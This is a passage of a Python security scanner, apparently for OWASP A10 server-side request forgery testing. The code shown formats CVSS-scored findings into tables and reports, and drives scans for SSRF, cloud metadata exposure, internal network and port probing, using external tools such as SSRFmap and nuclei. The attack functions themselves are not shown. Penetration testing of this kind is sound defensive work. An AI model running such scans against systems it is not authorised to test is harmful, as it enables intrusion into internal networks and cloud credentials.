            mapping["cvss_vector"],
            mapping["description"]
        )
    
    console.print(vuln_table)
    console.print()
    
    # CVSS Summary Table
    console.print("\n" + "="*80)
    console.print("[bold green]📈 CVSS SCORE SUMMARY[/bold green]")
    console.print("="*80)
    
    summary_table = Table(title="📈 CVSS Score Summary", header_style="bold green", border_style="green")
    summary_table.add_column("Metric", style="cyan", width=20)
    summary_table.add_column("Value", style="yellow", width=15)
    summary_table.add_column("Description", style="white", width=45)
    
    total_findings = sum(len(categorized[sev]) for sev in categorized)
    avg_cvss = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0
    max_cvss = max(cvss_scores) if cvss_scores else 0
    min_cvss = min(cvss_scores) if cvss_scores else 0
    
    summary_table.add_row("Total Findings", str(total_findings), "All vulnerabilities found")
    summary_table.add_row("Average CVSS", f"{avg_cvss:.1f}", "Mean CVSS score across all findings")
    summary_table.add_row("Highest CVSS", f"{max_cvss:.1f}", "Most severe vulnerability found")
    summary_table.add_row("Lowest CVSS", f"{min_cvss:.1f}", "Least severe vulnerability found")
    summary_table.add_row("Critical Count", str(len(categorized["CRITICAL"])), "CVSS 9.0-10.0 vulnerabilities")
    summary_table.add_row("High Count", str(len(categorized["HIGH"])), "CVSS 7.0-8.9 vulnerabilities")
    summary_table.add_row("Medium Count", str(len(categorized["MEDIUM"])), "CVSS 4.0-6.9 vulnerabilities")
    summary_table.add_row("Low Count", str(len(categorized["LOW"])), "CVSS 0.1-3.9 vulnerabilities")
    
    console.print(summary_table)
    console.print()

    # Check if any findings exist
    total_findings = sum(len(categorized[sev]) for sev in categorized)
    
    if total_findings == 0:
        console.print("\n" + "="*80)
        console.print("[bold yellow]📋 NO VULNERABILITIES FOUND[/bold yellow]")
        console.print("="*80)
        console.print("[green]✅ No SSRF vulnerabilities detected in the scan.[/green]")
        console.print("[green]✅ Target appears to be secure against Server-Side Request Forgery attacks.[/green]")
        console.print("[yellow]💡 This could mean:[/yellow]")
        console.print("  • Target has proper input validation")
        console.print("  • SSRF endpoints are not accessible")
        console.print("  • Network restrictions are in place")
        console.print("  • Security headers are properly configured")
    else:
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if categorized[sev]:
                console.print(f"\n[{SEVERITY_LEVELS[sev]['color']}]{sev} FINDINGS[/]:")
                for item in categorized[sev]:
                    console.print(f"  - {item['source']}: {item['finding']}")

def save_summary(findings, categorized, vulnerability_details, cvss_scores):
    with open(os.path.join(OUTPUT_DIR, "summary.txt"), "w", encoding="utf-8") as f:
        for sev in categorized:
            f.write(f"{sev}: {len(categorized[sev])} findings\n")
        f.write("\n=== DETAILS ===\n")
        for file, items in categorized.items():
            f.write(f"\n[{file}]\n")
            for item in items:
                sev, _, _, _ = classify_severity_advanced(item['finding'])
                f.write(f"[{sev}] {item['finding']}\n")
    
    # Save detailed report with CVSS
    report = f"""
A10 Server-Side Request Forgery Scan Report - CVSS Standard
Generated: {datetime.now()}
Total Findings: {len(findings)}
Average CVSS Score: {sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0:.1f}

=== CRITICAL FINDINGS (CVSS 9.0-10.0) ===
{chr(10).join([item['finding'] for item in categorized['CRITICAL']])}

=== HIGH FINDINGS (CVSS 7.0-8.9) ===  
{chr(10).join([item['finding'] for item in categorized['HIGH']])}

=== MEDIUM FINDINGS (CVSS 4.0-6.9) ===
{chr(10).join([item['finding'] for item in categorized['MEDIUM']])}

=== LOW FINDINGS (CVSS 0.1-3.9) ===
{chr(10).join([item['finding'] for item in categorized['LOW']])}

=== VULNERABILITY DETAILS ===
"""
    
    for detail in vulnerability_details:
        report += f"""
Type: {detail['type']}
CVSS Score: {detail['cvss_score']}
CVSS Vector: {detail['cvss_vector']}
Severity: {detail['severity']}
Description: {detail['description']}
Finding: {detail['finding']}
"""

    report += """
=== A10 COVERAGE ===
✅ SSRF Detection (CVSS 9.8)
✅ Cloud Metadata Testing (CVSS 9.8)
✅ Internal Network Scanning (CVSS 7.5)
✅ Port Scanning via SSRF (CVSS 6.5)
✅ Protocol Testing (CVSS 6.5)
✅ Information Disclosure Detection (CVSS 5.3)
✅ SSRFmap Docker Integration (CVSS 9.8)
✅ Nuclei SSRF Templates (Enhanced)
✅ Katana Endpoint Discovery
✅ Nikto Web Server Scanning
✅ Custom Debug Header Analysis
✅ Advanced SSRF Security Testing
"""
    save_output("a10_detailed_report.txt", report)
    console.print("[green]💾 Summary saved[/green]")

# ================== MAIN ==================
def main(target):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    target = normalize_url(target)
    base_name = sanitize_filename(target)
    start = datetime.now()
    
    console.print(f"\n[bold yellow][*] Starting Advanced A10 Server-Side Request Forgery Scan for {target}[/bold yellow]\n")

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:
        
        # Step 1: Basic scans
        task1 = progress.add_task("Running basic SSRF checks...", total=None)
        header_findings = check_ssrf_headers(target)
        ssrf_endpoints = find_ssrf_endpoints(target)
        nuclei_output = run_nuclei_ssrf_templates(target)
        ssrfmap_output = run_ssrfmap_scan(target)
        katana_output = run_katana_scan(target)
        nikto_output = run_nikto_scan(target)
        custom_debug_output = run_custom_debug_tests(target)
        progress.update(task1, completed=True)
        
        # Step 2: Advanced A10 scans
        task2 = progress.add_task("Running SSRF detection...", total=None)
        ssrf_findings = detect_ssrf_vulnerabilities(target)
        progress.update(task2, completed=True)

        task3 = progress.add_task("Running cloud metadata testing...", total=None)
        cloud_findings = test_cloud_metadata_endpoints(target)
        progress.update(task3, completed=True)

        task4 = progress.add_task("Running internal network scanning...", total=None)
        network_findings = scan_internal_network(target)
        progress.update(task4, completed=True)

        task5 = progress.add_task("Running internal port scanning...", total=None)
        port_findings = scan_internal_ports(target)
        progress.update(task5, completed=True)

        task6 = progress.add_task("Running protocol testing...", total=None)
        protocol_findings = test_internal_protocols(target)
        progress.update(task6, completed=True)

        task7 = progress.add_task("Running information disclosure detection...", total=None)
        info_findings = detect_information_disclosure(target)
        progress.update(task7, completed=True)

        # Step 3: Analysis
        task8 = progress.add_task("Analyzing results...", total=None)
        analyze_results()
        progress.update(task8, completed=True)

    console.print(f"[green][*] Advanced A10 Scan completed in {datetime.now() - start}[/green]")
    console.print(f"[bold yellow][*] Check {OUTPUT_DIR}/a10_detailed_report.txt for comprehensive results[/bold yellow]")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        console.print("[red]Usage: python A10.py <target_url>[/red]")
        sys.exit(1)
    main(sys.argv[1])
